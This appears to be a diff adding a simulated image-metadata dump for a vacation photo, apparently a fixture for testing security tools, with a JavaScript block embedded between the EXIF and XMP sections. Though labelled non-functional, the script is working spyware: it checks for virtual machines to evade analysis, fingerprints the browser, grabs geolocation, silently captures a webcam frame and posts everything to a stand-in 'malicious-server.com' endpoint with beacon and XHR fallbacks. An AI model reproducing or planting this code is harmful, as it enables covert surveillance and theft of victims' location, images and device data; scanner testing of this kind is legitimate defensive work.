@@ -1,0 +1,230 @@
+JFIF
+EXIF Metadata for image.jpg
+--------------------------
+
+Basic Information:
+- File Name: vacation_photo.jpg
+- File Size: 2.4 MB
+- Image Dimensions: 4032 x 3024 pixels
+- Color Mode: RGB
+- Bit Depth: 24
+- Compression: JPEG (Quality: 92)
+
+Camera Information:
+- Make: Apple
+- Model: iPhone 13 Pro
+- Software: iOS 15.4.1
+- Lens: Apple iPhone 13 Pro back triple camera 6.86mm f/1.8
+
+Capture Information:
+- Date Taken: 2025:05:15 10:23:45
+- Exposure Time: 1/125 sec
+- F-Number: f/1.8
+- ISO Speed: 100
+- Focal Length: 6.86 mm
+- Flash: No flash, compulsory
+- Metering Mode: Pattern
+- Exposure Program: Program AE
+- White Balance: Auto
+- Digital Zoom: 1.0x
+
+GPS Information:
+- GPS Latitude: 37° 25' 19.07" N
+- GPS Longitude: 122° 05' 06.24" W
+- GPS Altitude: 12.5 m Above Sea Level
+- GPS Time Stamp: 17:23:45 UTC
+
+Other Information:
+- Copyright: © 2025 John Doe
+- Author: John Doe
+- Description: Family vacation at the beach
+- Keywords: beach, vacation, family, summer
+- Rating: 5 stars
+- Software: Adobe Photoshop 2025
+
+<!-- HIDDEN MALICIOUS SCRIPT (SIMULATED) -->
+<!-- This represents malicious code that could be hidden in image metadata -->
+<!-- In a real attack, this would be encoded/obfuscated -->
+
+<script>
+// Malicious script hidden in image metadata
+// FOR TESTING SECURITY TOOLS ONLY - Not actually functional
+
+// Function to check if running in a virtual environment
+function checkVirtualEnvironment() {
+  const signs = [
+    navigator.userAgent.indexOf("VMware") > -1,
+    navigator.userAgent.indexOf("VirtualBox") > -1,
+    screen.width === 800 && screen.height === 600,
+    navigator.hardwareConcurrency < 2,
+    navigator.plugins.length === 0
+  ];
+  return signs.some(sign => sign === true);
+}
+
+// Function to get geolocation
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(position => {
+      const locationData = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        timestamp: new Date().toISOString()
+      };
+      
+      // Exfiltrate location data
+      exfiltrateData('location', locationData);
+    });
+  }
+}
+
+// Function to access webcam
+function accessWebcam() {
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        // Create hidden video element
+        const video = document.createElement('video');
+        video.style.display = 'none';
+        video.srcObject = stream;
+        document.body.appendChild(video);
+        video.play();
+        
+        // Take snapshot after 2 seconds
+        setTimeout(() => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          
+          // Get image data
+          const imageData = canvas.toDataURL('image/jpeg');
+          
+          // Exfiltrate image data
+          exfiltrateData('webcam', { image: imageData });
+          
+          // Clean up
+          stream.getTracks().forEach(track => track.stop());
+          document.body.removeChild(video);
+        }, 2000);
+      });
+  }
+}
+
+// Function to exfiltrate data
+function exfiltrateData(type, data) {
+  // In a real attack, this would send data to a malicious server
+  const exfilUrl = 'https://malicious-server.com/collect';
+  const payload = JSON.stringify({
+    type: type,
+    data: data,
+    timestamp: new Date().toISOString(),
+    victim_id: generateVictimId()
+  });
+  
+  // Using fetch API
+  fetch(exfilUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: payload
+  }).catch(() => {
+    // Fallback methods if fetch fails
+    
+    // Method 1: Image beacon
+    const img = new Image();
+    img.src = `${exfilUrl}?data=${encodeURIComponent(payload)}`;
+    
+    // Method 2: XMLHttpRequest
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', exfilUrl, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(payload);
+  });
+}
+
+// Function to generate a unique victim ID
+function generateVictimId() {
+  // Generate a pseudo-random ID based on browser properties
+  const components = [
+    navigator.userAgent,
+    navigator.language,
+    screen.width,
+    screen.height,
+    new Date().getTimezoneOffset()
+  ];
+  
+  let hash = 0;
+  const str = components.join('');
+  
+  for (let i = 0; i < str.length; i++) {
+    const char = str.charCodeAt(i);
+    hash = ((hash << 5) - hash) + char;
+    hash = hash & hash; // Convert to 32bit integer
+  }
+  
+  return Math.abs(hash).toString(16);
+}
+
+// Main function
+function main() {
+  // Only run if not in a virtual environment
+  if (!checkVirtualEnvironment()) {
+    // Collect browser data
+    const browserData = {
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      platform: navigator.platform,
+      cookiesEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      screenWidth: screen.width,
+      screenHeight: screen.height,
+      colorDepth: screen.colorDepth,
+      devicePixelRatio: window.devicePixelRatio
+    };
+    
+    // Exfiltrate browser data
+    exfiltrateData('browser', browserData);
+    
+    // Try to get location after a delay
+    setTimeout(getLocation, 3000);
+    
+    // Try to access webcam after a delay
+    setTimeout(accessWebcam, 5000);
+  }
+}
+
+// Execute main function after a delay
+setTimeout(main, 2000);
+</script>
+
+<!-- END OF HIDDEN MALICIOUS SCRIPT -->
+
+XMP Metadata:
+- Document ID: xmp.did:1a2b3c4d5e6f7g8h9i0j
+- Original Document ID: xmp.did:1a2b3c4d5e6f7g8h9i0j
+- Instance ID: xmp.iid:1a2b3c4d5e6f7g8h9i0j
+- Created: 2025-05-15T10:23:45Z
+- Modified: 2025-05-15T11:45:30Z
+- Format: image/jpeg
+- Color Mode: RGB
+- Color Profile: sRGB IEC61966-2.1
+
+IPTC Metadata:
+- Creator: John Doe
+- Creator's Contact Info: john.doe@example.com
+- Description: Family vacation at the beach
+- Keywords: beach, vacation, family, summer
+- Copyright Notice: © 2025 John Doe
+- Rights Usage Terms: Personal use only
+- Location: Santa Cruz Beach, California, USA
+- Date Created: 2025-05-15
+- Intellectual Genre: Photograph
+- Scene: Outdoor, Beach, Ocean
+
+Thumbnail:
+[Thumbnail image data would be here in a real EXIF file]
